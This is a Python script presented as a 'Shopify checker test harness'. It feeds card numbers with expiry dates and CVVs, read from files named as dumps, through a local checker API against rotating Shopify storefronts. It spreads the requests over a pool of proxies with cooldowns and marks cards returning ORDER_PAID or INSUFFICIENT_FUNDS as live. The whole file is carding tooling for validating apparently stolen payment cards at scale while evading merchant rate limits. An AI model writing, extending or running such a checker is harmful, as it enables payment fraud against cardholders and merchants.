#!/usr/bin/env python3
"""
Shopify checker test harness (v2 flow).

Reads:
  - CCs     from test/hq_dumps_part11.txt   (format: cc|mm|yy|cvv)
  - sites   from site.txt
  - proxies from proxy.txt                  (format: user:pass@host:port)

Calls the running /shopii API with:
  - max 5 checks at a time
  - sites rotated round-robin
  - proxies rotated round-robin with a 60s cooldown after each use

Output (coloured):
  Card                        Currency   Price      Response              Time
  cc|mm|yy|cvv                USD        0.00       CARD_DECLINED         4.21s

  Status True  -> green row
  Declined     -> red row
  Error/Other  -> yellow row

Usage:
  .venv/bin/python test_runner.py                # run everything
  .venv/bin/python test_runner.py --limit 20     # run first 20 cards
  .venv/bin/python test_runner.py --api http://127.0.0.1:8002/shopii
"""

from __future__ import annotations

import argparse
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

BASE = Path(__file__).resolve().parent
DEFAULT_CC_FILE = BASE / "archive" / "test" / "split_2_of_3_x20000.txt"
DEFAULT_SITE_FILE = BASE / "site.txt"
DEFAULT_PROXY_FILE = BASE / "proxy.txt"
DEFAULT_API = "http://127.0.0.1:8002/shopii"

MAX_WORKERS = 100
PROXY_COOLDOWN = 60.0   # seconds before a proxy can be reused
HTTP_TIMEOUT = 130.0    # must be > the API's 120s REQUEST_TIMEOUT

# ── ANSI colours ──────────────────────────────────────────────────────
RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[32m"
RED = "\033[31m"
YELLOW = "\033[33m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"

_STATUS_TRUE = {"ORDER_PAID", "INSUFFICIENT_FUNDS"}


class ProxyRotator:
    """Round-robin proxy pool with a per-proxy cooldown."""

    def __init__(self, proxies: list[str], cooldown: float = PROXY_COOLDOWN):
        self.proxies = proxies
        self.cooldown = cooldown
        self._last_used: dict[str, float] = {}
        self._idx = 0
        self._lock = threading.Lock()

    def acquire(self) -> str:
        """Return the next non-cooling proxy, blocking until one is free."""
        while True:
            wait = 0.0
            with self._lock:
                n = len(self.proxies)
                now = time.monotonic()
                for _ in range(n):
                    proxy = self.proxies[self._idx % n]
                    self._idx = (self._idx + 1) % n
                    if now - self._last_used.get(proxy, 0.0) >= self.cooldown:
                        self._last_used[proxy] = now
                        return proxy
                # all proxies cooling: wait for the soonest one to free up
                soonest = min(
                    self._last_used.get(p, 0.0) + self.cooldown
                    for p in self.proxies
                )
                wait = soonest - time.monotonic()
            if wait > 0:
                time.sleep(wait)


def load_lines(path: Path) -> list[str]:
    """Read non-empty lines, stripped, preserving order."""
    if not path.is_file():
        raise SystemExit(f"missing file: {path}")
    lines = []
    for raw in path.read_text(encoding="utf-8", errors="replace").splitlines():
        line = raw.strip()
        if line:
            lines.append(line)
    return lines


def colour_row(status_true: bool, response: str) -> str:
    if status_true:
        return GREEN
    up = response.upper()
    if "CAPTCHA" in up or "3DS" in up or "VERIFY" in up:
        return MAGENTA
    if "DECLINED" in up or "FAILED" in up or "DENIED" in up:
        return RED
    return YELLOW


def check_card(cc: str, site: str, rotator: ProxyRotator, api: str) -> str:
    """Acquire a proxy, hit /shopii, return the formatted row string."""
    proxy = rotator.acquire()
    t0 = time.monotonic()
    try:
        resp = requests.get(
            api,
            params={"cc": cc, "site": site, "proxy": proxy},
            timeout=HTTP_TIMEOUT,
        )
        try:
            data = resp.json()
        except Exception:
            data = {}
    except Exception as exc:  # connection refused, timeout, bad proxy, etc.
        elapsed = time.monotonic() - t0
        msg = f"CONN_ERROR:{type(exc).__name__}".replace(" ", "")
        return _format_row(cc, "?", "0.00", msg, elapsed, False)

    elapsed = float(data.get("elapsed") or (time.monotonic() - t0))
    currency = str(data.get("Currency") or "?")
    price = str(data.get("Price") or "0.00")
    response = str(data.get("Response") or "UNKNOWN")
    status = str(data.get("Status") or "false").lower() == "true"
    status_true = status or response.upper() in _STATUS_TRUE
    return _format_row(cc, currency, price, response, elapsed, status_true)


def _format_row(cc: str, currency: str, price: str, response: str,
                elapsed: float, status_true: bool) -> str:
    colour = colour_row(status_true, response)
    row = (
        f"{cc:<26}  "
        f"{currency:<9}  "
        f"{price:<9}  "
        f"{response:<20}  "
        f"{elapsed:.2f}s"
    )
    return f"{colour}{row}{RESET}"


def main() -> None:
    parser = argparse.ArgumentParser(description="Shopify checker test harness (v2 flow)")
    parser.add_argument("--cc-file", default=str(DEFAULT_CC_FILE))
    parser.add_argument("--site-file", default=str(DEFAULT_SITE_FILE))
    parser.add_argument("--proxy-file", default=str(DEFAULT_PROXY_FILE))
    parser.add_argument("--api", default=DEFAULT_API)
    parser.add_argument("--limit", type=int, default=None,
                        help="check only the first N cards")
    parser.add_argument("--workers", type=int, default=MAX_WORKERS,
                        help="max concurrent checks (default 5)")
    args = parser.parse_args()

    ccs = load_lines(Path(args.cc_file))
    sites = load_lines(Path(args.site_file))
    proxies = load_lines(Path(args.proxy_file))

    if not ccs:
        raise SystemExit("cc file is empty")
    if not sites:
        raise SystemExit("site file is empty")
    if not proxies:
        raise SystemExit("proxy file is empty")

    if args.limit is not None:
        ccs = ccs[: args.limit]

    workers = max(1, min(args.workers, MAX_WORKERS))
    rotator = ProxyRotator(proxies)
    print_lock = threading.Lock()

    header = (
        f"{CYAN}{BOLD}"
        f"{'Card':<26}  {'Currency':<9}  {'Price':<9}  "
        f"{'Response':<20}  {'Time':<7}"
        f"{RESET}"
    )
    print(header)
    print("-" * (26 + 2 + 9 + 2 + 9 + 2 + 20 + 2 + 7))

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = []
        for i, cc in enumerate(ccs):
            site = sites[i % len(sites)]   # site rotation
            future = pool.submit(check_card, cc, site, rotator, args.api)
            futures.append(future)

        for future in as_completed(futures):
            row = future.result()
            with print_lock:
                print(row)

    print(f"\n{DEFAULT_CC_FILE.name}: {len(ccs)} cards  "
          f"| sites: {len(sites)}  | proxies: {len(proxies)}  "
          f"| workers: {workers}")


if __name__ == "__main__":
    main()
